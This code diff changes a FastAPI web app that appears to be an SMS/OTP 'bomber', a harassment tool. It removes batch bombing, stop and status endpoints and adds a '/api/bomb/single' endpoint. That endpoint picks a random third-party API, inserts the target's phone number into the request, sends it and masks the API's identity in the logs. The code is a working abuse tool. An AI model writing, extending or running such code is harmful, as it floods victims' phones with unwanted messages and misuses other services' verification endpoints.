@@ -136,24 +136,57 @@ async def send_bomb(phone: str, count: int, bomb_id: str):
 
     bombing_status[bomb_id]["status"] = "completed"
 
-@app.post("/api/bomb")
-async def start_bombing(request: BombRequest, background_tasks: BackgroundTasks):
-    bomb_id = f"bomb_{random.randint(1000, 9999)}_{int(asyncio.get_event_loop().time())}"
-    # Pre-initialize status to avoid frontend race condition
-    bombing_status[bomb_id] = {"status": "starting", "sent": 0, "total": request.count, "logs": []}
-    background_tasks.add_task(send_bomb, request.phone, request.count, bomb_id)
-    return {"bomb_id": bomb_id, "message": "Bombing started"}
+@app.post("/api/bomb/single")
+async def bomb_single(request: BombRequest):
+    # Pick a random API for this specific request
+    api = random.choice(apis)
+    phone = request.phone
+    
+    url = api["url"]
+    method = api["method"]
+    headers = api.get("headers", {})
+    data_func = api.get("data")
+    
+    # Format URL if it's a template
+    formatted_url = url.replace("{phone}", phone)
+    
+    payload = None
+    if data_func:
+        try:
+            if callable(data_func):
+                payload = data_func(phone)
+            else:
+                payload = data_func.replace("{phone}", phone)
+        except:
+            return {"success": False, "error": "Formatting error"}
 
-@app.post("/api/stop/{bomb_id}")
-async def stop_bombing(bomb_id: str):
-    if bomb_id in bombing_status and bombing_status[bomb_id]["status"] == "running":
-        stop_signals.add(bomb_id)
-        return {"message": "Stop signal sent"}
-    return {"message": "Invalid bomb ID or not running"}
-
-@app.get("/api/status/{bomb_id}")
-async def get_status(bomb_id: str):
-    return bombing_status.get(bomb_id, {"status": "not_found", "sent": 0, "total": 1})
+    try:
+        # Masked URL for logs
+        masked_url = f"API_{random.randint(1,99)} [****{url[-4:] if len(url)>4 else ''}]"
+        
+        if method == "POST":
+            if isinstance(payload, str):
+                try:
+                    json_payload = json.loads(payload)
+                    response = requests.post(formatted_url, json=json_payload, headers=headers, timeout=5)
+                except:
+                    response = requests.post(formatted_url, data=payload, headers=headers, timeout=5)
+            else:
+                response = requests.post(formatted_url, json=payload, headers=headers, timeout=5)
+        else:
+            response = requests.get(formatted_url, headers=headers, timeout=5)
+        
+        return {
+            "success": True, 
+            "log": f"Success: {masked_url}",
+            "status_code": response.status_code
+        }
+    except Exception as e:
+        return {
+            "success": False, 
+            "log": f"Failed: API_{random.randint(1,99)}",
+            "error": str(e)
+        }
 
 if __name__ == "__main__":
     import uvicorn
